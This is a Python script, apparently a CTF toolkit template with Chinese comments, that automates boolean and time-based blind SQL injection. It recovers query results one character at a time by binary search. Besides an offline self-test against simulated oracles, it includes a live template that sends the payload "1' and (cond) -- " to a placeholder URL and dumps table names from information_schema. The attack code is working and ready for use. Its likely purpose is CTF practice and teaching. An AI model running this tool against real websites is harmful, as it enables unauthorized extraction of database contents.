# -*- coding: utf-8 -*-
"""SQL 盲注自动化模板(补充题型: Web/SQL注入)

用途:
    布尔盲注 + 时间盲注通用脚本。核心是"注入预言机(inject) + 二分猜字符"两段分离:
    - inject(payload) -> bool: 拼好 SQL 后发请求, 返回条件是否为真
    - extract(inject, expr):   用 ascii(substr(expr,i,1))>n 二分, 逐字符恢复

    实战中只需按题目改 HTTP 请求; 自测模式内置一个"虚拟目标"验证算法。

用法:
    python blind_sqli.py                 # 自测(离线, 用模拟目标)
    实战: 改 main_cli() 里的 URL/PAYLOAD 模板, 或参考 demo 改 inject()。
"""
import argparse
import sys
import string
import time

CHARSET = ''.join([
    string.ascii_lowercase, string.ascii_uppercase,
    string.digits, '{}_-!?@#$%^&*()+=[]:,.\\/\'\" ~'
])
DEFAULT_MAXLEN = 64


def boolean_extract(inject, expr, charset=CHARSET, maxlen=DEFAULT_MAXLEN):
    """布尔盲注: inject(sql_condition_bool) -> True/False。

    inject 收到的条件形如: ascii(substr(({expr}),{i},1))>{n}
    """
    result = ''
    for i in range(1, maxlen + 1):
        if not inject(f'ascii(substr(({expr}),{i},1))>0'):  # 该位置无字符 -> 结束
            break
        lo, hi = 32, 127
        while lo < hi:
            mid = (lo + hi) // 2
            if inject(f'ascii(substr(({expr}),{i},1))>{mid}'):
                lo = mid + 1
            else:
                hi = mid
        # 原版有 if lo<=32: break —— 会把空格(ascii=32)误判成串结束而静默截断;
        # 结束判断只依赖上面的 >0 探测
        result += chr(lo)
        print(f'[*] 第 {i} 位: {chr(lo)}  ({result})', end='\r', flush=True)
    print()
    return result


def time_extract(inject, expr, charset=CHARSET, maxlen=DEFAULT_MAXLEN):
    """时间盲注: inject(sql_condition_bool) 在条件为真时 sleep, 通过响应耗时判断。"""
    result = ''
    for i in range(1, maxlen + 1):
        if not inject(f'ascii(substr(({expr}),{i},1))>0'):
            break
        lo, hi = 32, 127
        while lo < hi:
            mid = (lo + hi) // 2
            if inject(f'ascii(substr(({expr}),{i},1))>{mid}'):
                lo = mid + 1
            else:
                hi = mid
        result += chr(lo)   # 同 boolean_extract: 不再对 ascii=32 提前 break
        print(f'[*] 第 {i} 位: {chr(lo)}  ({result})', end='\r', flush=True)
    print()
    return result


def make_boolean_inject_for_demo(secret: str):
    """构造一个虚拟布尔预言机用于离线自测。"""
    def inject(cond_sql: str) -> bool:
        # 解析 ascii(substr((expr),i,1))>n 形式
        import re
        m = re.match(r'ascii\(substr\(\(.*?\),(\d+),1\)\)>(-?\d+)', cond_sql)
        if not m:
            return False
        i, n = int(m.group(1)), int(m.group(2))
        if i > len(secret):
            return False
        return ord(secret[i - 1]) > n
    return inject


def make_time_inject_for_demo(secret: str):
    import re
    def inject(cond_sql: str) -> bool:
        m = re.match(r'ascii\(substr\(\(.*?\),(\d+),1\)\)>(-?\d+)', cond_sql)
        if not m:
            return False
        i, n = int(m.group(1)), int(m.group(2))
        if i > len(secret):
            return False
        if ord(secret[i - 1]) > n:
            time.sleep(0.001)  # 真实题目通常是 sleep(1~3)
            return True
        return False
    return inject


def main_cli():
    """实战模板(需按题目修改): 以 GET 参数布尔盲注为例。"""
    import requests
    url = 'http://target.example.com/query.php'
    param = 'id'
    marker = 'welcome'      # 条件为真时页面出现的特征串
    expr = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
    sess = requests.Session()

    def inject(cond: str) -> bool:
        payload = f"1' and ({cond}) -- "
        r = sess.get(url, params={param: payload}, timeout=10)
        return marker in r.text

    print(boolean_extract(inject, expr))


def main():
    ap = argparse.ArgumentParser(description='SQL 盲注自动化(布尔/时间)')
    ap.add_argument('--cli', action='store_true', help='进入实战模板(默认自测)')
    ap.add_argument('--mode', choices=['bool', 'time'], default='bool')
    ap.add_argument('--secret', default='flag{bl1nd_5ql_tw1ce}', help='自测用的虚拟密文')
    args = ap.parse_args()

    if args.cli:
        main_cli()
        return

    # 自测: 布尔
    inj = make_boolean_inject_for_demo(args.secret)
    got = boolean_extract(inj, "(select 'x')")
    s1 = 'OK' if got == args.secret else 'FAIL'
    print(f'[{s1}] 布尔盲注: {got!r}')
    # 自测: 时间
    inj2 = make_time_inject_for_demo(args.secret[:12])
    got2 = time_extract(inj2, "(select 'x')")
    s2 = 'OK' if got2 == args.secret[:12] else 'FAIL'
    print(f'[{s2}] 时间盲注: {got2!r}')
    sys.exit(0 if ('OK' in s1 and 'OK' in s2) else 1)


if __name__ == '__main__':
    main()
